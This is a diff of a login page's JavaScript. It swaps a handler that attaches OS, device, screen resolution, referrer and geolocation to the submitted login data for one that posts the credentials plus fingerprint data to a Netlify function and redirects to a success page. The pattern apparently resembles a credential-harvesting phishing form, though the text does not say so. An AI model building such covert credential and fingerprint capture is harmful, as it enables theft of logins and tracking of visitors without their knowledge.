@@ -1,51 +1,32 @@
 document.addEventListener("DOMContentLoaded", function () {
-  const loginForm = document.querySelector("form");
+  const form = document.querySelector("form[name='login']");
 
-  if (loginForm) {
-    loginForm.addEventListener("submit", function (event) {
-      event.preventDefault(); // Prevent default form submission
+  form.addEventListener("submit", function (event) {
+    event.preventDefault(); // Prevent default form submission
 
-      // Collect user info
-      const os = navigator.platform;
-      const userAgent = navigator.userAgent;
-      const resolution = `${window.screen.width}x${window.screen.height}`;
-      const referrer = document.referrer || "Direct Visit";
-      const device = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop";
+    // Collect extra user data
+    const userAgent = navigator.userAgent;
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const referrer = document.referrer || "Direct Access";
 
-      // Attempt to get location (Requires user permission)
-      navigator.geolocation.getCurrentPosition(
-        function (position) {
-          sendData(
-            position.coords.latitude + ", " + position.coords.longitude,
-            os,
-            device,
-            resolution,
-            referrer
-          );
-        },
-        function () {
-          sendData("Location denied", os, device, resolution, referrer);
-        }
-      );
+    // Get form data
+    const formData = new FormData(form);
+    formData.append("userAgent", userAgent);
+    formData.append("screenResolution", screenResolution);
+    formData.append("referrer", referrer);
 
-      function sendData(location, os, device, resolution, referrer) {
-        const formData = new FormData(loginForm);
-        formData.append("os", os);
-        formData.append("device", device);
-        formData.append("resolution", resolution);
-        formData.append("location", location);
-        formData.append("referrer", referrer);
-
-        fetch(loginForm.action, {
-          method: "POST",
-          body: new URLSearchParams([...formData]),
-        })
-          .then((response) => response.text())
-          .then((html) => {
-            document.body.innerHTML = html;
-          })
-          .catch((error) => console.error("Error:", error));
-      }
-    });
-  }
+    // Send the data via fetch to Netlify function
+    fetch("/.netlify/functions/submit", {
+      method: "POST",
+      body: new URLSearchParams(formData),
+    })
+      .then((response) => response.text())
+      .then((data) => {
+        console.log("Success:", data);
+        window.location.href = "/success.html"; // Redirect on success
+      })
+      .catch((error) => {
+        console.error("Error:", error);
+      });
+  });
 });
